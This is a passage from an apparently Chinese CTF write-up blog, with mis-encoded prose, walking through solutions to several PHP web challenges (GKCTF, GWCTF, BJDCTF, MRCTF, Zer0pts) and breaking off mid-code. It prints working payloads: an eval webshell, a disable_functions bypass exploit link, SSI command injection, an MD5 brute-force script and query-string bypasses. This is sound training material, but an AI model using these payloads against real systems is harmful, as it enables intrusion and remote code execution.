<p>å¦‚æœæƒ³é€šè¿‡ç¬¬äºŒä¸ªifè¯­å¥æ¥è¾“å‡ºflagçš„è¯ï¼Œå°±è¦å»è¦†ç›–<code>$flag</code>ï¼Œå³<code>$yds=$flag</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥GETä¼ å‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?yds&#x3D;flag</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äº<code>$yds=$flag</code>ã€‚</p>
<p>å¦‚æœæƒ³é€šè¿‡ç¬¬ä¸‰ä¸ªifè¯­å¥æ¥è¾“å‡ºflagï¼Œå°±è¦å»è¦†ç›–<code>$is</code>ï¼Œå³<code>$is=$flag</code>ï¼Œå¹¶ä¸”GETä¸­è¦æœ‰flagå‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?is&#x3D;flag&amp;flag&#x3D;flag</span><br></pre></td></tr></table></figure>
<h2 id="GKCTF2020-CheckIN">GKCTF2020 CheckIN</h2>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>disable_functionç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸€ä¸‹phpinfoï¼Œå‘ç°ç¦ç”¨äº†å¾ˆå¤šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702101014.png" alt=""></p>
<p>å†™ä¸€ä¸ªshellç”¨èšå‰‘è¿æ¥ï¼Œ<code>eval($_POST[123]);</code>ï¼Œç»è¿‡base64ç¼–ç æ˜¯<code>ZXZhbCgkX1BPU1RbMTIzXSk7</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702102011.png" style="zoom:67%;" />
<p>æµè§ˆæ ¹ç›®å½•å‘ç°è¦ç”¨<code>readflag</code>è¯»å–flagæ–‡ä»¶ï¼Œä¸Šä¼ <a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php">php7-diable_function-bypass</a> Pocè‡³/tmpç›®å½•ä¸‹ï¼Œç„¶åç”¨includeåŒ…å«è¯¥æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702102424.png" alt=""></p>
<h2 id="GWCTF2019-æ¯ç‡¥çš„æŠ½å¥–">GWCTF2019 æ¯ç‡¥çš„æŠ½å¥–</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<p>æŸ¥çœ‹æºä»£ç æœ‰ä¸€æ®µJSä»£ç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;check.php #p1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&quot;.close&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;#myAlert&quot;</span>).hide();</span><br><span class="line">    &#125;);	     </span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;#button1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	$(<span class="string">&quot;#myAlert&quot;</span>).hide();</span><br><span class="line">    	guess=$(<span class="string">&quot;input&quot;</span>).val();</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">	   type: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">	   url: <span class="string">&quot;check.php&quot;</span>,</span><br><span class="line">	   data: <span class="string">&quot;num=&quot;</span>+guess,</span><br><span class="line">		   success: <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">		     $(<span class="string">&quot;#div2&quot;</span>).append(msg);</span><br><span class="line">		     alertmsg = $(<span class="string">&quot;#flag&quot;</span>).text(); </span><br><span class="line">		     <span class="keyword">if</span>(alertmsg==<span class="string">&quot;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&quot;</span>)&#123;</span><br><span class="line">		      $(<span class="string">&quot;#myAlert&quot;</span>).attr(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-warning&quot;</span>);</span><br><span class="line">		      <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).text()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">		     	$(<span class="string">&quot;#new&quot;</span>).append(alertmsg);</span><br><span class="line">		     &#125;</span><br><span class="line">		     <span class="keyword">else</span>&#123;		     	</span><br><span class="line">		     	$(<span class="string">&quot;#myAlert&quot;</span>).attr(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-success&quot;</span>);</span><br><span class="line">		     	<span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).text()==<span class="string">&quot;&quot;</span>)	</span><br><span class="line">		     		$(<span class="string">&quot;#new&quot;</span>).append(alertmsg);	</span><br><span class="line">		     &#125;</span><br><span class="line"></span><br><span class="line">		 </span><br><span class="line">		   &#125;</span><br><span class="line">		&#125;); </span><br><span class="line">		$(<span class="string">&quot;#myAlert&quot;</span>).show();</span><br><span class="line">		$(<span class="string">&quot;#new&quot;</span>).empty();</span><br><span class="line">		 $(<span class="string">&quot;#div2&quot;</span>).empty();</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>å†å»çœ‹<code>check.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ODuHdhCHWY</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-EasySearch">BJDCTF2020 EasySearch</h2>
<h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3>
<ul>
<li>MD5æˆªæ–­éªŒè¯</li>
</ul>
<h3 id="è§£é¢˜-v7">è§£é¢˜</h3>
<p>ç”¨dirmapæ‰«ä¸€éï¼Œå‘ç°<code>index.php.swp</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            $file_shtml = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            $text = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»£ç ç¬¬14è¡Œæ˜æ˜¾æ˜¯è€ƒå¯ŸMD5æˆªæ–­è®¤è¯ï¼Œç›´æ¥ç”¨è„šæœ¬çˆ†ç ´</p>
<blockquote>
<p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/yesec/p/11297568.html">https://www.cnblogs.com/yesec/p/11297568.html</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">&#x27;6d0bc1&#x27;</span>      <span class="comment">#å·²çŸ¥çš„md5æ˜æ–‡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">text</span>):</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span>(<span class="params">code</span>):</span>   </span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])  </span><br><span class="line">    end = int(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">6</span>] == knownMd5:            </span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">list=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):    <span class="comment">#è¿™é‡Œçš„range(number)æŒ‡çˆ†ç ´å‡ºå¤šå°‘ç»“æœåœæ­¢</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#ä½¿ç”¨å¤šçº¿ç¨‹åŠ å¿«çˆ†ç ´é€Ÿåº¦</span></span><br><span class="line">pool.map(findCode, list) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°password:2020666</p>
<p>ç„¶åä»¥adminï¼Œ2020666ç™»å½•ï¼Œåœ¨headerä¸­å‘ç°éšæœºç”Ÿæˆçš„æ–‡ä»¶æ‰€åœ¨è·¯å¾„ã€‚è®¿é—®ä¹‹ï¼Œå‘ç°ç•Œé¢ä¸ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705153955.png" alt=""></p>
<p>çœ‹åˆ°è¿™ä¸ªadminçŒœæµ‹è‚¯å®šæœ‰æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯ç”¨<code>&#123;&#123;7*'7'&#125;&#125;</code>éªŒè¯ä¸€ç›´è¿”å›failï¼ŒæŸ¥é˜…wpå¾—çŸ¥æ˜¯SSIæ³¨å…¥ï¼ˆæˆ‘ä¹‹å‰éƒ½æ²¡å¬è¿‡ï¼‰ã€‚</p>
<blockquote>
<p>å¯ä»¥é€šè¿‡publicæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶åç¼€å.shtmlå¾—åˆ°çº¿ç´¢</p>
<p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">å‚è€ƒæ–‡ç« </a></p>
</blockquote>
<p>åœ¨usernameè®¾ç½®<code>&lt;!--#exec cmd=&quot;å‘½ä»¤&quot;--&gt;ï»¿</code>ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p>
<h3 id="æ‹“å±•-v2">æ‹“å±•</h3>
<p>å¦ä¸€ç§å½¢å¼çš„MD5æˆªæ–­éªŒè¯ï¼š</p>
<p><a href="https://www.cnblogs.com/yesec/p/11300841.html">https://www.cnblogs.com/yesec/p/11300841.html</a></p>
<h2 id="MRCTF2020-å¥—å¨ƒ">MRCTF2020 å¥—å¨ƒ</h2>
<h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3>
<ul>
<li><code>$_SERVER['QUERY_STRING']</code>ç»•è¿‡</li>
<li>ä»£ç å®¡è®¡</li>
</ul>
<h3 id="è§£é¢˜-v8">è§£é¢˜</h3>
<h4 id="ç¬¬ä¸€å±‚">ç¬¬ä¸€å±‚</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>é¢˜å¤–è¯ï¼š<code>$_SERVER['QUERY_STRING']</code>ä¸ä¼šè¿›è¡ŒURLDecodeï¼Œè€Œ<code>$_GET[]</code>ä¼šå°†å‚æ•°è¿›è¡ŒURLDecode</p>
</blockquote>
<p>åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassç¬¬ä¸€ä¸ªifè¯­å¥ã€‚</p>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
</blockquote>
<p>ç¬¬äºŒä¸ªifä¸­æ­£åˆ™åŒ¹é…è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ï¼Œç”±äºåœ¨å­—ç¬¦ä¸²ä¸­æ¢è¡Œå¯ä»¥è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ‰€ä»¥å¯ä»¥ç”¨%0aç»•è¿‡ã€‚</p>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
</blockquote>
<p>æ‰€ä»¥ç¬¬ä¸€å±‚çš„payloadå°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708195848.png" alt=""></p>
<h4 id="ç¬¬äºŒå±‚">ç¬¬äºŒå±‚</h4>
<p>æŸ¥çœ‹æºä»£ç ï¼Œæœ‰ä¸€å¤§ä¸²çš„JSFuckç¼–ç ï¼Œç›´æ¥æ‹¿åˆ°consoleè·‘</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708200030.png" alt=""></p>
<p>æç¤ºéœ€è¦POSTä¸€ä¸‹Merakæ•°æ®ï¼Œå†…å®¹ä»»æ„ã€‚ç»§ç»­å®¡è®¡ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>åªå…è®¸æœ¬åœ°ç™»å½•ï¼Œé‚£ä¹ˆå°±åŠ ä¸Š<code>Client-IP:127.0.0.1</code>çš„Headerã€‚æ¥ç€ä½¿ç”¨dataä¼ªåè®®ä»<code>2333</code>å‚æ•°ä¸­è¯»å–<code>todat is a happy day</code>ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯é€†å‘changeå‡½æ•°ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr(ord($v[$i]) - $i*<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$real = unchange(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($real);</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥ç¬¬äºŒå±‚çš„payloadå°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?2333&#x3D;data:text&#x2F;plain,tadat is a happy day&amp;file&#x3D;ZmpdYSZmXGI&#x3D;</span><br></pre></td></tr></table></figure>
<h2 id="Zer0pts2020-Can-you-guess-it">[Zer0pts2020]Can you guess it?</h2>
<h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3>
<ul>
<li><code>$_SEVER['PHP_SELF']</code>åˆ©ç”¨</li>
<li><code>basename()</code>ç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v9">è§£é¢˜</h3>
<p>åˆ©ç”¨ç‚¹åœ¨:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯å‰é¢è¿˜æœ‰è¿‡æ»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>$_SERVER['PHP_SELF']</code>æˆ‘ä»¬çŸ¥é“å®ƒçš„å€¼æ˜¯urlç›¸å¯¹è·¯å¾„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥<code>/index.php/config.php?source</code> ä¼šè¿”å›<code>/index.php/config.php</code></p>
<p>æˆ‘ä»¬çŸ¥é“<code>preg_match</code> æ˜¯éœ€è¦å®Œå…¨åŒ¹é…æ‰ä¼šè¿”å›trueçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥<code>/index.php/config.php/a</code>å°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯basenameçš„ç»“æœä¼šæ˜¯<code>a</code>æ˜¾ç„¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ²¡è¿™ä¸ªæ–‡ä»¶ã€‚æ­¤æ—¶æˆ‘ä»¬æƒ³åˆ°äº†basenameä¼šå¿½ç•¥ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦<code>%80 ~ %ff</code>ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¾“å…¥<code>/index.php/comfig.php/%ff</code> å°±å¯ä»¥è¿›è¡Œæ˜¾ç¤ºcomfig.phpæ–‡ä»¶ï¼Œè¿™é‡Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åœ¨index.phpä¸‹è¿›è¡Œçš„ï¼ˆæˆ‘ä»¬çœ‹åˆ°çš„ä»£ç éƒ½æ˜¯index.phpçš„ä»£ç ï¼‰ã€‚å½“ç„¶æˆ‘ä»¬ä¸è¦å¿˜è®°ä¼ getçš„å˜é‡sourceã€‚</p>
<p>payloadï¼š<code>/index.php/config.php/%81?source</code></p>
<h2 id="BJDCTF2020-EzPHP">[BJDCTF2020]EzPHP</h2>
<h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3>
<ul>
<li>QUERY_STRINGç»•è¿‡</li>
<li>SHA1æ•°ç»„ç»•è¿‡</li>
<li>preg_matchæ•°ç»„ç»•è¿‡</li>
<li>extractå˜é‡è¦†ç›–</li>
<li>create_functionæ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v10">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line">$shana = $_GET[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">$arg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$code = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple 